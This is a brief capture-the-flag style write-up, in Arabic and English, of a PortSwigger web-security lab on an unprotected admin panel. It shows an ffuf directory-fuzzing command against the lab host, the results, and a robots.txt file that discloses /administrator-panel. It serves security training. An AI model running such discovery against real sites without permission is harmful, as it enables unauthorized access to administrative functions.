# Lab : Unprotected admin functionality L

https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

- الفكره من الLab ده ان موقع الadmin panel مش متامن كويس مش محتاج اي تاكيد للهويه تخش عليه علطول وتعمل الي انت عاوزه

```bash
1. ffuf -u https://0a4b0071030889ae8279a1d9006c0063.web-security-academy.net/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/raft-medium-files.txt -fc 403

2. favicon.ico             [Status: 200, Size: 15406, Words: 11, Lines: 1, Duration: 141ms]
robots.txt              [Status: 200, Size: 45, Words: 3, Lines: 3, Duration: 129ms]
Robots.txt              [Status: 200, Size: 45, Words: 3, Lines: 3, Duration: 135ms]

3. https://0a4b0071030889ae8279a1d9006c0063.web-security-academy.net/robots.txt 

4. User-agent: *
Disallow: /administrator-panel
```
